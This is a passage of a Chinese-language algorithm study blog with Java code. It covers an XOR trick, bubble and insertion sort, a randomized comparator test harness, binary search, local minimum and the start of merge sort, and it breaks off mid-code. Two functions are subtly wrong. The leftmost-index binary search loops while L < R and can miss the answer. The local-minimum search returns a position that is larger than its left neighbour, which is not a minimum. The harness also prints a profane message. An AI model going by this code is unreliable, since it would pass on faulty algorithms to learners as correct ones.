comment">// 为所求的数的其中之一</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> cur<span class="token operator">:</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 寻找所有第i位为0的数</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>cur <span class="token operator">&amp;</span> rightOne<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 即第i位如果为0</span>            b <span class="token operator">^=</span> cur<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b <span class="token operator">+</span><span class="token string">", "</span><span class="token operator">+</span><span class="token punctuation">(</span>m <span class="token operator">^</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p>0, 1, 2, …, i, i+1, …, length-1</p><p>第一轮：[0, length-1]，arr[0] vs arr[1] 逆序则交换，最后arr[length-1]即为最大</p><p>第二轮：[0, length-2]，交换之后，arr[length-2]即为次大</p><p>遍历所有</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>i<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span>arr<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> j<span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><p>0, 1, 2, …, i, i+1, …, length-1</p><p>[0, 0] 从0往前看，有序则停</p><p>[0, 1] 从1往前看，如果逆序则交换，直至[0, 1]有序</p><p>[0, i] 从i往前看，如果小于前一个数，就进行交换，一直往前交换到前面没有数，或者大于前一个数（即有序）为止</p><blockquote><p>选择排序和冒泡排序与数组排列情况无关，但是插入排序有关，因为如果参数为已经有序的数组，则复杂度为O(n)，否则为O(n2)</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">insertionSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">(</span>j<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span>arr<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> j<span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="对数器"><a href="#对数器" class="headerlink" title="对数器"></a>对数器</h2><ol><li><p> 有一个你想要测的方法a</p></li><li><p> 实现复杂度不好但是容易实现的方法b</p></li><li><p> 实现一个随机样本产生器</p></li><li><p> 把方法a和方法b跑相同的随机样本，看看得到的结果是否一样</p></li><li><p> 如果有一个随机样本使得比对结果不一致，打印样本进行人工干预，改对方法a或者 方法b</p></li><li><p> 当样本数量很多时比对测试依然正确，可以确定方法a已经正确</p></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">comparator</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Math.random() -> [0,1) 所有的小数，等概率返回一个</span><span class="token comment">// （计算机中是可以实现对[0,1）的所有小数穷举的，因为计算机认为是有限的）</span><span class="token comment">// Math.random() * N -> [0,N) 所有小数，等概率返回一个</span><span class="token comment">// (int)(Math.random() * N) -> [0,N-1] 所有的整数，等概率返回一个</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">generateRandomArray</span><span class="token punctuation">(</span><span class="token keyword">int</span> maxSize<span class="token punctuation">,</span> <span class="token keyword">int</span> maxValue<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 使数组长度随机</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>maxSize <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 使数组的值随机</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>maxValue <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>maxValue <span class="token operator">*</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">copyArray</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isEqual</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr1<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>arr1 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> arr2 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>arr1 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> arr2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr1 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> arr2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr1<span class="token punctuation">.</span>length <span class="token operator">!=</span> arr2<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr1<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printArray</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> testTime <span class="token operator">=</span> <span class="token number">500000</span><span class="token punctuation">;</span>    <span class="token comment">// 设置数组最大尺寸和最大值</span>    <span class="token keyword">int</span> maxSize <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> maxValue <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> succeed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> testTime<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr1 <span class="token operator">=</span> <span class="token function">generateRandomArray</span><span class="token punctuation">(</span>maxSize<span class="token punctuation">,</span> maxValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr2 <span class="token operator">=</span> <span class="token function">copyArray</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">bubbleSort</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">comparator</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isEqual</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span> arr2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            succeed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>succeed <span class="token operator">?</span> <span class="token string">"Nice!"</span> <span class="token operator">:</span> <span class="token string">"Fucking fucked!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token function">generateRandomArray</span><span class="token punctuation">(</span>maxSize<span class="token punctuation">,</span> maxValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printArray</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">bubbleSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printArray</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二分法的利用"><a href="#二分法的利用" class="headerlink" title="二分法的利用"></a>二分法的利用</h2><h3 id="在一个有序数组中，找-gt-某个数最左侧的位置"><a href="#在一个有序数组中，找-gt-某个数最左侧的位置" class="headerlink" title="在一个有序数组中，找&gt;=某个数最左侧的位置"></a>在一个有序数组中，找&gt;=某个数最左侧的位置</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">nearestIndex</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> <span class="token class-name">L</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token class-name">R</span> <span class="token operator">=</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token class-name">L</span> <span class="token operator">&lt;</span> <span class="token class-name">R</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token class-name">L</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">R</span> <span class="token operator">-</span> <span class="token class-name">L</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">>=</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                index <span class="token operator">=</span> mid<span class="token punctuation">;</span>                <span class="token class-name">R</span> <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">L</span> <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> index<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="局部最小值"><a href="#局部最小值" class="headerlink" title="局部最小值"></a>局部最小值</h3><p>对于位置0和位置length-1，只要位置0小于位置1或者位置length-1小于位置length-2，即可返回位置0或者位置length-1。否则对于i-1, i, i+1 如果位置i小于位置i-1和位置i+1，则位置i即为局部最小值。求出一个局部最小值的位置即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">BSlocalMin</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">int</span> <span class="token class-name">L</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> <span class="token class-name">R</span> <span class="token operator">=</span> arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token class-name">R</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>arr<span class="token punctuation">[</span><span class="token class-name">R</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token class-name">R</span><span class="token punctuation">;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token class-name">L</span> <span class="token operator">&lt;</span> <span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token class-name">L</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">R</span> <span class="token operator">-</span> <span class="token class-name">L</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> mid<span class="token punctuation">;</span>                <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token class-name">R</span> <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">else</span> <span class="token class-name">L</span> <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p>0, 1, 2, …, i, i+1, …, length-1</p><p>[0, m] [m+1, length-1] 分别使两个区间有序，然后设立辅助数组，将两个有序区间合并到辅助数组中即可</p><p>合并规则：在两个区间分别从头开始（即分别0和m+1开始）遍历，左侧区间如果 &lt;= 右侧，则拷贝左侧区间值到辅助数组中，然后遍历用的下标+1即可，否则就拷贝右侧区间值，然后下标+1，如果左侧或者右侧区间遍历用的下标越界，则将另一个区间的剩余值直接拷贝即可</p><p>最后将辅助数组拷贝至原数组</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">process</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">L</span><span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">L</span> <span class="token operator">==</span> <span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token class-name">L</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token operator">-</span><span class="token class-name">L</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token class-name">L</span><span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">R</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">merge</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token class-name">L</span><span class="token punctuation">,</span> mid<span class="token punctuation">,</span> <span class="token class-name">R</span><span class="token punctuation">)</span><span class="token 